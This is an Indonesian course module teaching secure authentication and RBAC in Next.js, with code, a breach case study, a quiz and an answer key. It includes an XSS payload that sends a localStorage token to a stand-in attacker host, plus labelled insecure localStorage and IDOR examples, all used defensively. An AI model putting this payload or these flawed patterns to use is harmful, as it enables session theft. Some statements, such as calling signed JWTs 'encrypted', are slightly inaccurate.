# MODUL 09: AUTENTIKASI DAN OTORISASI PENGGUNA

> **Mata Kuliah:** Pengembangan Aplikasi Web Modern  
> **Target Audiens:** Mahasiswa S1 Informatika / Sistem Informasi (Semester 3)  
> **Alokasi Waktu:** 3 SKS (150 Menit Tatap Muka + 180 Menit Praktikum Mandiri)  
> **Prasyarat:** Modul 01 (Protokol HTTP & Cookies), Modul 05 (Next.js App Router & Middleware), Modul 06 (Server Actions & Mutasi)  
> **Penyusun:** Senior Full-stack Engineer & Dosen Praktisi  

---

## 1. RINGKASAN MODUL & RELEVANSI INDUSTRI

Jika ada satu komponen aplikasi web yang paling sering menjadi penyebab developer dipanggil oleh pimpinan perusahaan pada jam 3 pagi dengan wajah pucat, komponen itu adalah **Sistem Autentikasi dan Otorisasi**. Kesalahan styling hanya membuat tombol miring; kesalahan database mungkin membuat aplikasi lambat; tetapi kesalahan pada arsitektur autentikasi dapat menyebabkan data identitas ratusan ribu pengguna bocor ke internet publik, mengundang tuntutan hukum, denda regulasi privasi data (seperti UU PDP di Indonesia atau GDPR di Eropa), dan menghancurkan reputasi bisnis dalam hitungan jam.

Banyak mahasiswa dan developer junior menganggap autentikasi hanyalah masalah *"membuat form login, mencocokkan password, lalu menyimpan token ke `localStorage`"*. Di industri profesional, praktik menyimpan token di `localStorage` dikategorikan sebagai **kelalaian keamanan kritis (critical vulnerability)** karena rentan terhadap serangan *Cross-Site Scripting (XSS)*. Selain itu, banyak developer terjebak dalam ilusi keamanan: mengira bahwa dengan memasang pengecekan login di Next.js `middleware.ts`, seluruh aplikasi sudah aman — padahal API endpoint dan *Server Actions* mereka masih bisa dieksekusi langsung oleh penyerang tanpa validasi hak akses di lapisan data.

Modul ini dirancang untuk membongkar tuntas mekanika keamanan web modern. Kita akan membedah perbedaan filosofis antara **Stateful Sessions** dan **Stateless JWTs**, memahami cara kerja perlindungan berbasis **HttpOnly, Secure, SameSite Cookies**, mengimplementasikan arsitektur keamanan bertingkat (*Defense-in-Depth*) melalui **Data Access Layer (DAL)** di Next.js 15, dan merancang sistem **Role-Based Access Control (RBAC)** yang kokoh dan type-safe.

---

## 2. CAPAIAN PEMBELAJARAN MODUL (CPM)

Setelah menyelesaikan modul dan praktikum ini, mahasiswa diharapkan mampu:

1. **Membedah Autentikasi vs Otorisasi**: Mengartikulasikan perbedaan fungsional antara verifikasi identitas (Who are you? - HTTP 401) dan pengendalian izin akses (What can you do? - HTTP 403).
2. **Menganalisis Trade-off Session vs JWT**: Memilih strategi persistensi sesi yang tepat (Database Session vs Encrypted JWT) berdasarkan skala sistem, kebutuhan *instant revocation*, dan arsitektur infrastruktur server.
3. **Mencegah Vektor Serangan Web Umum**: Menerapkan pertahanan proaktif terhadap serangan XSS, CSRF (Cross-Site Request Forgery), Session Hijacking, dan Credential Stuffing menggunakan mitigasi cookies modern.
4. **Menerapkan Pola Pengamanan Berlapis (Defense-in-Depth)**: Membangun proteksi rute optimistik di level Edge Middleware dan validasi otorisasi absolut di level Data Access Layer (DAL) serta Server Actions.
5. **Membangun Arsitektur RBAC Type-Safe**: Merancang skema peran pengguna bertingkat (misal: `ADMIN`, `LECTURER`, `STUDENT`) dengan enforcement hak akses data yang terintegrasi penuh di ekosistem TypeScript dan React Server Components.

---

## 3. PRASYARAT & PENGETAHUAN AWAL

Sebelum mempelajari modul ini, pastikan Anda telah memahami:
- Header HTTP, mekanisme Cookie `Set-Cookie`, dan status code HTTP (`401 Unauthorized`, `403 Forbidden`) dari **Modul 01**.
- Next.js Middleware dan hierarki file-system routing dari **Modul 05**.
- Penggunaan Server Actions dan validasi skema input dengan Zod dari **Modul 06**.
- Konsep enkripsi simetris/asimetris dan hashing satu arah (One-Way Hashing).

---

## 4. MATERI INTI & CATATAN LAPANGAN DOSEN

### 4.1 Autentikasi vs Otorisasi: Batasan yang Sering Kabur

Di ruang rapat teknis, dua istilah ini sering diucapkan bergantian secara keliru. Mari kita buat garis demarkasi yang tegas:

```
[ Pengguna Datang ]
       |
       v
+-----------------------------+
|    AUTENTIKASI (AuthN)      |  "Siapa Anda sebenarnya?"
|   (Authentication - 401)    |  - Verifikasi Kredensial: Email + Password / OTP / OAuth
+-----------------------------+  - Jika gagal: 401 Unauthorized
       |
       | Sukses: Identitas Terverifikasi (User ID: 104, Role: "STUDENT")
       v
+-----------------------------+
|     OTORISASI (AuthZ)       |  "Apakah Anda berhak mengakses sumber daya ini?"
|    (Authorization - 403)    |  - Pengecekan Izin: Apakah "STUDENT" boleh menghapus nilai ujian?
+-----------------------------+  - Jika dilarang: 403 Forbidden
       |
       | Sukses: Izin Diberikan
       v
[ Eksekusi Data / Tampilkan UI ]
```

- **401 Unauthorized:** Secara teknis artinya *"Unauthenticated"* (Identitas Anda tidak diketahui atau kredensial Anda tidak valid/kedaluwarsa).
- **403 Forbidden:** Server tahu persis siapa Anda (misalnya Anda adalah Mahasiswa yang sah), tetapi Anda dilarang keras mengakses halaman rekapitulasi gaji dosen atau mutasi nilai.

---

### 4.2 Pertarungan Arsitektur: Stateful Session vs Stateless JWT

Bagaimana server mengingat bahwa pengguna sudah berhasil login pada permintaan (request) HTTP berikutnya?

```
ARSITEKTUR 1: STATEFUL SESSION (DATABASE / REDIS)
Client                        Server                     Database / Redis
  |                             |                               |
  |--- 1. POST /login --------->|                               |
  |    (email, password)        |--- 2. Validasi & Buat ID ---->| Simpan session_id di DB
  |                             |<-- 3. session_id: "abc-123" --|
  |<-- 4. Set-Cookie: ----------|
  |       session_id=abc-123    |
  |                             |
  |--- 5. GET /profile -------->|--- 6. Cari "abc-123" -------->| Cek apakah masih aktif?
  |       (Cookie: abc-123)     |<-- 7. User: { id: 10, ... } --|
  |<-- 8. Render Data ----------|

ARSITEKTUR 2: STATELESS JWT (JSON WEB TOKEN)
Client                        Server                     Database
  |                             |                               |
  |--- 1. POST /login --------->|                               |
  |    (email, password)        |--- 2. Validasi User --------->|
  |                             |<-- 3. User Data Valid --------|
  |                             |--- 4. Sign JWT via Secret ----| (Tidak perlu simpan di DB!)
  |<-- 5. Set-Cookie: ----------|    JWT = Header.Payload.Signature
  |       token=eyJhbGci...     |
  |                             |
  |--- 6. GET /profile -------->|--- 7. Verifikasi Signature ---| (Hitung matematis secara lokal!)
  |       (Cookie: eyJhbGci...) |    - Tanpa query database     |
  |<-- 8. Render Data ----------|    - Jika valid -> izinkan    |
```

#### Analisis Perbandingan Rekayasa

| Parameter Evaluasi | Stateful Session (Database/Redis) | Stateless JWT |
| :--- | :--- | :--- |
| **Beban Database** | **Tinggi**: Setiap satu request HTTP dari user memicu query database untuk cek session. | **Nol**: Verifikasi dilakukan via komputasi CPU kriptografi lokal di server memory. |
| **Pencabutan Izin (Revocation)** | **Seketika (Instant)**: Hapus session di Redis, user langsung ter-logout detik itu juga. | **Sulit**: Selama token belum *expired*, token tetap valid kecuali ada arsitektur *blocklist* di Redis (yang meniadakan sifat stateless-nya). |
| **Ukuran Payload** | **Kecil**: Hanya mengirim UUID string pendek (~36 karakter). | **Besar**: Berisi claims dan signature base64 (~300 - 800 bytes di setiap header request). |
| **Kompatibilitas Serverless** | Membutuhkan koneksi Redis/DB terpusat yang cepat. | **Sempurna untuk Edge / Serverless** karena verifikasi dilakukan terdistribusi tanpa network call. |

> **Catatan Lapangan Dosen:** Di aplikasi monolitik konvensional dengan pengguna terbatas, Database Session dengan Redis adalah pilihan paling aman karena Anda bisa melakukan *Force Logout* seketika jika akun dibajak. Namun, di arsitektur Next.js modern dengan Edge runtime, **Encrypted Session Cookie via JWT ringan (durasi pendek: misal 15-60 menit)** adalah standar industri yang paling efisien.

---

### 4.3 Dosa Besar `localStorage` vs Perlindungan `HttpOnly` Cookies

Jika Anda mencari tutorial login di blog umum atau video YouTube usang, Anda akan sering melihat kode ini:

```javascript
// ❌ DOSA BESAR KEAMANAN WEB!
const res = await fetch("/api/login", { ... });
const { token } = await res.json();
localStorage.setItem("authToken", token); // JANGAN PERNAH LAKUKAN INI!
```

#### Mengapa Menyimpan Token di `localStorage` Adalah Bencana?
`localStorage` dapat diakses oleh **seluruh kode JavaScript yang berjalan di origin domain Anda** via `window.localStorage`. 

Jika aplikasi Anda memiliki satu celah kecil **Cross-Site Scripting (XSS)** — misalnya menampilkan komentar pengguna tanpa sanitasi, atau salah satu dari 200 pustaka npm eksternal yang Anda pasang disusupi skrip jahat (*supply-chain attack*) — penyerang cukup menyuntikkan satu baris kode:

```javascript
// Skrip penyerang mencuri token dan mengirimkannya ke server mereka
new Image().src = `https://evil-hacker.com/steal?t=${localStorage.getItem("authToken")}`;
```
Dalam sekejap, penyerang memiliki token login korban dan bisa menguras seluruh data tanpa perlu tahu password aslinya!

#### Solusi Standar Industri: Cookie Berbendera Keamanan Lengkap

Token sesi harus disimpan di dalam **HTTP Cookie** yang dikirimkan oleh server dengan 3 flag wajib:

```
Set-Cookie: session=eyJhbGci...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
```

1. **`HttpOnly`**: Menginstruksikan browser bahwa cookie ini **TIDAK BOLEH DIAKSES OLEH JAVASCRIPT** (`document.cookie` tidak bisa membacanya). Skrip XSS jahat tidak akan pernah bisa mencuri token ini!
2. **`Secure`**: Cookie hanya boleh ditransmisikan melalui koneksi terenkripsi **HTTPS**. Mencegah serangan sniffing jaringan di Wi-Fi publik (*Man-In-The-Middle*).
3. **`SameSite=Lax` (atau `Strict`)**: Melindungi aplikasi dari serangan **CSRF (Cross-Site Request Forgery)** dengan mencegah browser menyertakan cookie ini pada permintaan lintas situs yang berbahaya.

---

### 4.4 Mengamankan Sesi di Next.js 15: Implementasi Modul Sesi

Mari kita bangun pustaka sesi mandiri yang aman dan type-safe menggunakan pustaka standar industri `jose` (tanpa runtime overhead besar):

```bash
npm install jose
```

```typescript
// src/lib/session.ts
import "server-only"; // Menjamin modul ini HANYA bisa diimpor di server
import { SignJWT, jwtVerify } from "jose";
import { cookies } from "next/headers";

// Ambil secret key dari environment variable (minimal 32 karakter)
const secretKey = process.env.SESSION_SECRET;
if (!secretKey || secretKey.length < 32) {
  throw new Error("CRITICAL: SESSION_SECRET belum diset atau kurang dari 32 karakter!");
}
const encodedKey = new TextEncoder().encode(secretKey);

export type UserRole = "ADMIN" | "LECTURER" | "STUDENT";

export interface SessionPayload {
  userId: string;
  role: UserRole;
  expiresAt: Date;
}

/**
 * Membuat token JWT terenkripsi dengan masa berlaku 7 hari
 */
export async function encryptSession(payload: Omit<SessionPayload, "expiresAt">): Promise<string> {
  return new SignJWT({ ...payload })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt()
    .setExpirationTime("7d")
    .sign(encodedKey);
}

/**
 * Memverifikasi dan mendekripsi token JWT
 */
export async function decryptSession(token: string | undefined): Promise<SessionPayload | null> {
  if (!token) return null;
  try {
    const { payload } = await jwtVerify(token, encodedKey, {
      algorithms: ["HS256"],
    });
    return payload as unknown as SessionPayload;
  } catch (error) {
    // Token tidak valid, expired, atau tanda tangan dipalsukan
    return null;
  }
}

/**
 * Menyimpan sesi pengguna ke dalam HttpOnly Secure Cookie
 */
export async function createSession(userId: string, role: UserRole) {
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
  const sessionToken = await encryptSession({ userId, role });

  const cookieStore = await cookies();
  cookieStore.set("session", sessionToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    expires: expiresAt,
    path: "/",
  });
}

/**
 * Menghapus sesi (Logout)
 */
export async function deleteSession() {
  const cookieStore = await cookies();
  cookieStore.delete("session");
}
```

---

### 4.5 Arsitektur Pertahanan Berlapis (Defense-in-Depth)

Banyak developer pemula mengira bahwa jika mereka sudah memasang pengecekan login di `middleware.ts`, mereka tidak perlu lagi memeriksa autentikasi di dalam fungsi Server Actions. **INI ADALAH KESALAHPAHAMAN YANG SANGAT BERBAHAYA!**

Ingat:
- **Middleware** hanya melindungi navigasi rute halaman (UX optimistik).
- Penyerang yang cerdas bisa membuat HTTP request POST langsung ke Server Action endpoint tanpa memuat halaman HTML terlebih dahulu.
- Oleh karena itu, kita menerapkan filosofi **Defense-in-Depth (Pertahanan Berlapis)**:

```
  [ User HTTP Request ]
            |
            v
  +--------------------+
  | 1. EDGE MIDDLEWARE |  ===> Proteksi Rute Awal: Redirect user tak terotentikasi ke /login
  +--------------------+
            |
            v
  +--------------------+
  | 2. DATA ACCESS     |  ===> Server Component Layer: Verifikasi sesi sebelum mengambil data
  |    LAYER (DAL)     |
  +--------------------+
            |
            v
  +--------------------+
  | 3. SERVER ACTIONS  |  ===> Lapisan Eksekusi Mutasi: Verifikasi ulang User ID & Role sebelum UPDATE/DELETE
  |    AUTHORIZATION   |
  +--------------------+
```

#### Lapisan 1: Edge Middleware (`src/middleware.ts`)

```typescript
// src/middleware.ts
import { NextRequest, NextResponse } from "next/server";
import { decryptSession } from "@/lib/session";

// Daftar rute yang dilindungi
const protectedRoutes = ["/dashboard", "/profile", "/settings"];
const adminRoutes = ["/dashboard/admin", "/dashboard/users"];
const publicRoutes = ["/login", "/register", "/"];

export default async function middleware(req: NextRequest) {
  const path = req.nextUrl.pathname;
  const isProtectedRoute = protectedRoutes.some((route) => path.startsWith(route));
  const isAdminRoute = adminRoutes.some((route) => path.startsWith(route));
  const isPublicRoute = publicRoutes.includes(path);

  // Ambil token dari cookie
  const cookie = req.cookies.get("session")?.value;
  const session = await decryptSession(cookie);

  // 1. Jika rute terlindungi tetapi user belum login -> Arahkan ke /login
  if (isProtectedRoute && !session?.userId) {
    const loginUrl = new URL("/login", req.nextUrl);
    loginUrl.searchParams.set("callbackUrl", path); // Simpan tujuan asal
    return NextResponse.redirect(loginUrl);
  }

  // 2. Jika rute khusus ADMIN tetapi role bukan ADMIN -> Arahkan ke 403 Forbidden / Dashboard umum
  if (isAdminRoute && session?.role !== "ADMIN") {
    return NextResponse.redirect(new URL("/dashboard", req.nextUrl));
  }

  // 3. Jika user sudah login mencoba mengakses /login -> Lempar langsung ke /dashboard
  if (isPublicRoute && session?.userId && path === "/login") {
    return NextResponse.redirect(new URL("/dashboard", req.nextUrl));
  }

  return NextResponse.next();
}

// Konfigurasi matcher untuk mengabaikan asset statis
export const config = {
  matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"],
};
```

#### Lapisan 2: Data Access Layer (DAL) (`src/lib/dal.ts`)

Data Access Layer adalah tempat terpusat untuk mengambil data. Fungsi di DAL bertindak sebagai gerbang otentikasi internal:

```typescript
// src/lib/dal.ts
import "server-only";
import { cookies } from "next/headers";
import { decryptSession } from "./session";
import { redirect } from "next/navigation";
import { cache } from "react";

/**
 * Memverifikasi sesi aktif pengguna. Digunakan di Server Components dan Server Actions.
 * React cache() memastikan verifikasi hanya dieksekusi 1 kali per request tree.
 */
export const verifySession = cache(async () => {
  const cookieStore = await cookies();
  const token = cookieStore.get("session")?.value;
  const session = await decryptSession(token);

  if (!session?.userId) {
    redirect("/login");
  }

  return { isAuth: true, userId: session.userId, role: session.role };
});

/**
 * Mengambil profil pengguna saat ini secara aman
 */
export async function getCurrentUser() {
  const session = await verifySession();

  // Query database menggunakan userId dari sesi yang terverifikasi (BUKAN dari input client!)
  // Misal: return await db.user.findUnique({ where: { id: session.userId } });
  return {
    id: session.userId,
    role: session.role,
  };
}
```

#### Lapisan 3: Otorisasi Definitif di Server Actions

```typescript
// src/app/actions/academic.ts
"use server";

import { verifySession } from "@/lib/dal";
import { revalidatePath } from "next/cache";

export async function updateStudentGrade(studentId: string, newGrade: number) {
  // 1. Verifikasi Sesi & Hak Akses (Otorisasi)
  const session = await verifySession();

  // Aturan Bisnis: HANYA DOSEN ATAU ADMIN YANG BOLEH UBAH NILAI!
  if (session.role !== "LECTURER" && session.role !== "ADMIN") {
    throw new Error("403 Forbidden: Anda tidak memiliki wewenang untuk mengubah nilai mahasiswa!");
  }

  // 2. Eksekusi Mutasi ke Database secara Aman
  // await db.grade.update({ where: { studentId }, data: { score: newGrade } });

  revalidatePath("/dashboard/grades");
  return { success: true, message: "Nilai berhasil diperbarui." };
}
```

---

### 4.6 Catatan Lapangan Dosen & Perangkap Keamanan Kritis

#### Perangkap 1: "Trusting the Client-Supplied User ID" (IDOR Vulnerability)
Kesalahan fatal paling memalukan yang kerap ditemukan dalam audit keamanan aplikasi:

```typescript
// ❌ CELAH KEAMANAN TINGKAT TINGGI (Insecure Direct Object Reference / IDOR)
export async function deleteUserProfile(userIdFromClient: string) {
  // Developer lupa mencocokkan apakah user yang sedang login adalah pemilik ID tersebut!
  await db.user.delete({ where: { id: userIdFromClient } });
}
```
Seorang mahasiswa nakal bisa membuka DevTools, menjalankan `deleteUserProfile("id-milik-rektor")`, dan akun rektor terhapus seketika!

**Solusi Wajib:** Ambil `userId` dari **sesi server yang didekripsi**, jangan pernah mempercayai ID yang dikirimkan oleh argumen fungsi client!

#### Perangkap 2: Algoritma Hashing Password yang Usang (MD5 / SHA256)
Jangan pernah menggunakan MD5, SHA-1, atau SHA-256 murni untuk menyimpan password! Komputer modern atau GPU gaming kelas konsumen dapat menghitung **miliaran hash SHA-256 per detik** menggunakan *Rainbow Tables*. 

Gunakan algoritma *slow key-derivation function* yang dirancang khusus untuk password hashing dengan mekanisme *salt* otomatis:
- **Argon2id** (Standar pemenang kompetisi Password Hashing internasional terkini)
- **Bcrypt** (Standar industri yang sangat matang dengan salt-rounds minimal 12)

---

## 5. LATIHAN TERBIMBING & TUGAS MANDIRI

### Latihan Terbimbing: Mengamankan Halaman Dashboard dengan Role Guard

1. Buat Server Component `AdminDashboard`:
```tsx
// src/app/dashboard/admin/page.tsx
import { verifySession } from "@/lib/dal";
import { notFound } from "next/navigation";

export default async function AdminDashboardPage() {
  const session = await verifySession();

  // Jika bukan ADMIN, sembunyikan keberadaan halaman ini (404 Not Found)
  // Menyajikan 404 lebih aman daripada 403 karena penyerang tidak tahu halaman ini ada!
  if (session.role !== "ADMIN") {
    notFound();
  }

  return (
    <div className="p-8">
      <h1 className="text-2xl font-bold text-destructive">Area Terlarang: Administrator System</h1>
      <p className="mt-2 text-muted-foreground">User ID Terverifikasi: {session.userId}</p>
    </div>
  );
}
```

---

### Tugas Mandiri: Membangun Alur Autentikasi Lengkap dengan RBAC & Flash Message

**Deskripsi Tugas:**  
Bangun sistem autentikasi lengkap pada proyek mini Velqora dengan alur:
1. **Form Login:** Menerima email dan password, divalidasi dengan Zod schema.
2. **Server Action Login:** 
   - Memverifikasi kecocokan password menggunakan `bcryptjs.compare`.
   - Menginisialisasi HttpOnly Cookie sesi menggunakan fungsi `createSession` yang telah dibuat.
3. **Role-Based Redirect:**
   - Jika pengguna adalah `ADMIN`, arahkan ke `/dashboard/admin`.
   - Jika pengguna adalah `STUDENT`, arahkan ke `/dashboard/student`.
4. **Proteksi Middleware:** Pengguna yang belum login otomatis ditolak jika membuka halaman `/dashboard/*`.
5. **Tombol Logout:** Server Action yang memanggil `deleteSession()` dan me-redirect pengguna kembali ke `/login`.

---

## 6. STUDI KASUS NYATA: KEBOCOLAN 80.000 AKUN AKIBAT SUPPLY-CHAIN ATTACK PADA LOCALSTORAGE

### Latar Belakang Insiden
Pada awal tahun 2023, sebuah platform edukasi teknologi di Asia Tenggara mengalami insiden keamanan parah: kredensial dan sesi lebih dari 80.000 pengguna premium dijual di forum peretas gelap. Pengguna melaporkan bahwa akun mereka diambil alih tanpa adanya aktivitas login mencurigakan yang meminta kode OTP.

### Investigasi Forensik
Tim *Incident Response* melakukan audit forensik terhadap log server dan kode sumber front-end:
1. Arsitektur front-end aplikasi menggunakan Single Page Application (SPA) yang menyimpan `accessToken` dan `refreshToken` di dalam `window.localStorage`.
2. Tiga hari sebelum insiden, tim front-end memperbarui salah satu package npm visualisasi grafik pihak ketiga (`chart-library-xyz`) ke versi minor terbaru.
3. Package tersebut ternyata telah disusupi oleh penyerang melalui pencurian kredensial akun maintainer npm (*Supply-Chain Attack*).
4. Kode jahat yang disuntikkan ke dalam package grafik tersebut hanya berukuran 4 baris: ia memindai `localStorage`, mengambil token autentikasi pengguna, lalu membisikkannya ke endpoint bot Telegram milik penyerang.

### Tindakan Remediasi & Evaluasi Arsitektur
1. **Invalidasi Massal:** Seluruh sesi pengguna dibatalkan seketika di database.
2. **Penghapusan Total `localStorage`:** Seluruh mekanisme penanganan token dipindahkan ke arsitektur **HttpOnly, Secure, SameSite Cookies**.
3. **Penerapan CSP (Content Security Policy):** Membatasi domain mana saja yang diizinkan untuk melakukan transmisi data keluar dari browser pengguna.

**Pelajaran Berharga untuk Mahasiswa:**  
Jika tim tersebut sejak awal mematuhi standar dasar keamanan web dengan menyimpan token di **HttpOnly Cookie**, skrip jahat dari package npm tersebut **TIDAK AKAN BISA MEMBACA TOKEN**, dan insiden kebocoran data skala nasional tersebut tidak akan pernah terjadi.

---

## 7. REFLEKSI & JEBAKAN MENTAL

> **Jebakan Mental:** *"Aplikasi saya kan masih proyek skala kecil/tugas kuliah, jadi pakai autentikasi sederhana simpan token di localStorage atau password teks biasa tidak apa-apa."*

Kebiasaan buruk yang dipupuk selama masa perkuliahan adalah bom waktu di dunia industri. Ketika Anda terbiasa menulis kode yang tidak aman di lingkungan belajar:
- Otot memori (*muscle memory*) Anda akan secara refleks mengulanginya saat Anda bekerja di startup atau korporasi.
- Anda gagal membangun intuisi ancaman (*threat modeling mindset*).
- Kode tugas kuliah yang Anda unggah ke GitHub publik sering kali disalin oleh programmer lain atau menjadi portofolio yang dinilai sangat buruk oleh *tech lead* saat wawancara kerja.

Jadikan keamanan sebagai **fondasi utama sejak baris kode pertama**, bukan fitur tempelan yang baru dipikirkan satu minggu sebelum peluncuran sistem.

---

## 8. EVALUASI & KUIS PEMAHAMAN

### Soal 1
Apa perbedaan mendasar antara respon HTTP dengan kode status `401 Unauthorized` dan `403 Forbidden`?
- A. `401` digunakan untuk database error, sedangkan `403` digunakan untuk koneksi jaringan yang putus.
- B. `401` mengindikasikan bahwa identitas pengguna belum terotentikasi (belum login/kredensial salah), sedangkan `403` mengindikasikan bahwa identitas pengguna telah diketahui namun ia tidak memiliki hak akses/izin atas sumber daya tersebut.
- C. `401` ditujukan untuk peramban seluler, sedangkan `403` untuk peramban desktop.
- D. `401` membolehkan pengguna mengakses data publik, sedangkan `403` mematikan server secara darurat.

### Soal 2
Mengapa menyimpan token JWT sesi di `window.localStorage` sangat tidak direkomendasikan untuk aplikasi web modern yang sensitif?
- A. Karena `localStorage` otomatis terhapus setiap kali pengguna menutup tab peramban.
- B. Karena `localStorage` hanya memiliki batas kapasitas penyimpanan sebesar 500 byte.
- C. Karena nilai di dalam `localStorage` dapat diakses langsung oleh skrip JavaScript apa pun yang berjalan di origin tersebut, sehingga rentan dicuri jika terjadi serangan Cross-Site Scripting (XSS).
- D. Karena `localStorage` memperlambat kecepatan kompilasi server Next.js.

### Soal 3
Apa fungsi dari atribut `HttpOnly` pada header HTTP `Set-Cookie`?
- A. Memaksa situs web hanya dapat diakses melalui protokol HTTP biasa dan mematikan HTTPS.
- B. Mencegah skrip JavaScript di sisi client (misalnya `document.cookie`) membaca isi cookie tersebut, sehingga memitigasi pencurian sesi via XSS.
- C. Mempercepat pengiriman cookie dengan mengompresinya menjadi file zip.
- D. Membatasi cookie agar hanya bisa dibaca oleh pengguna yang menggunakan sistem operasi Windows.

### Soal 4
Seorang developer memasang pengecekan login di file `middleware.ts` Next.js untuk rute `/dashboard`. Namun, ia tidak memverifikasi hak akses di dalam fungsi Server Actions `deleteCourse(courseId: string)`. Apa resiko keamanan terbesar dari arsitektur ini?
- A. Server Actions akan gagal dikompilasi oleh TypeScript.
- B. Penyerang dapat membuat HTTP POST request langsung ke endpoint Server Action tanpa melewati navigasi halaman dashboard, sehingga dapat mengeksekusi penghapusan data secara ilegal.
- C. Middleware akan otomatis me-restart server setiap kali aksi penghapusan dipanggil.
- D. Browser pengguna akan mengalami memory leak.

### Soal 5
Apa keuntungan utama arsitektur *Stateless JWT* dibandingkan *Database Session* konvensional pada platform web berskala global yang menggunakan infrastruktur Edge/Serverless?
- A. JWT memungkinkan password pengguna di-reset otomatis setiap 5 menit.
- B. Server verifikator dapat memvalidasi keabsahan token secara kriptografis menggunakan public/secret key lokal tanpa perlu melakukan network call atau query ke database terpusat di setiap request.
- C. JWT tidak memerlukan koneksi internet sama sekali.
- D. JWT dapat membatalkan sesi pengguna secara instan dari sisi server tanpa komputasi tambahan.

### Soal 6
Manakah di antara algoritma berikut yang merupakan standar industri yang aman untuk melakukan hashing password pengguna sebelum disimpan ke database?
- A. MD5 dengan salt 4 karakter.
- B. SHA-1 standar.
- C. Bcrypt atau Argon2id.
- D. Base64 encoding.

### Soal 7
Dalam skenario serangan *Insecure Direct Object Reference (IDOR)*, bagaimana mitigasi yang paling tepat pada fungsi Server Action untuk memperbarui profil pengguna?
- A. Mengenkripsi form input nama pengguna menggunakan RSA di sisi browser.
- B. Mengambil ID pengguna secara langsung dari data sesi terenkripsi di server (`verifySession()`), bukan mengandalkan parameter ID yang dikirim bebas oleh payload form client.
- C. Menambahkan CAPTCHA di setiap klik tombol simpan profil.
- D. Membatasi ukuran foto profil maksimal 100 KB.

---

### Kunci Jawaban & Pembahasan Mendalam

- **Soal 1: B**  
  *Pembahasan:* `401 Unauthorized` menandakan masalah autentikasi (kredensial absen atau tidak valid). `403 Forbidden` menandakan masalah otorisasi (server mengenali pengguna, tetapi hak akses pengguna tidak mencukupi untuk melakukan tindakan tersebut).
- **Soal 2: C**  
  *Pembahasan:* Celah XSS memungkinkan kode JavaScript eksternal disuntikkan ke halaman. Karena `localStorage` dapat dibaca secara sinkron oleh API JavaScript global, token yang ada di dalamnya dapat langsung diekstraksi dan dieksfiltrasi oleh penyerang.
- **Soal 3: B**  
  *Pembahasan:* Flag `HttpOnly` adalah mekanisme pertahanan browser yang mengisolasi cookie dari DOM API (`document.cookie`), sehingga meskipun terjadi XSS, token sesi di cookie tetap aman dari pembacaan script.
- **Soal 4: B**  
  *Pembahasan:* Middleware Next.js berada di lapisan terluar perutean. Server Actions adalah endpoint RPC yang dapat dipanggil langsung melalui HTTP request. Mengamankan middleware saja tanpa memvalidasi sesi di dalam tubuh Server Action membuka celah fatal bagi siapa pun untuk mengeksekusi mutasi.
- **Soal 5: B**  
  *Pembahasan:* Sifat "stateless" JWT memungkinkan server di berbagai benua atau edge location memverifikasi keaslian klaim token secara instan hanya dengan memverifikasi signature kriptografis, mengeliminasi latency query ke database terpusat.
- **Soal 6: C**  
  *Pembahasan:* MD5 dan SHA-1/256 adalah general-purpose hash function yang terlalu cepat, membuatnya rentan terhadap serangan brute-force GPU modern. Bcrypt dan Argon2id adalah password-hashing function adaptif yang lambat secara sengaja dan menggunakan salt dinamis.
- **Soal 7: B**  
  *Pembahasan:* IDOR terjadi saat aplikasi mempercayai ID entitas yang dikirimkan pengguna mentah-mentah. Selalu verifikasi hak kepemilikan data dengan mencocokkan ID dari sesi server yang sah terhadap data yang ingin dimodifikasi di database.

---

## 9. REFERENSI & BACAAN LANJUTAN

1. **OWASP Top 10 - Broken Access Control & Cryptographic Failures**: [https://owasp.org/Top10/](https://owasp.org/Top10/) — Panduan ancaman keamanan aplikasi web nomor satu di dunia.
2. **Next.js Security & Authentication Architecture**: [https://nextjs.org/docs/app/building-your-application/authentication](https://nextjs.org/docs/app/building-your-application/authentication) — Pola resmi penerapan Data Access Layer (DAL) dan sesi di App Router.
3. **RFC 7519 - JSON Web Token (JWT)**: [https://datatracker.ietf.org/doc/html/rfc7519](https://datatracker.ietf.org/doc/html/rfc7519) — Spesifikasi standar industri untuk struktur dan keamanan JSON Web Token.
4. **MDN Web Docs - Using HTTP Cookies Safely**: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) — Penjelasan mendalam mengenai atribut HttpOnly, Secure, dan SameSite.
5. **Panva - Jose Library Documentation**: [https://github.com/panva/jose](https://github.com/panva/jose) — Dokumentasi pustaka universal kriptografi Web Crypto API untuk Node.js dan Edge runtime.
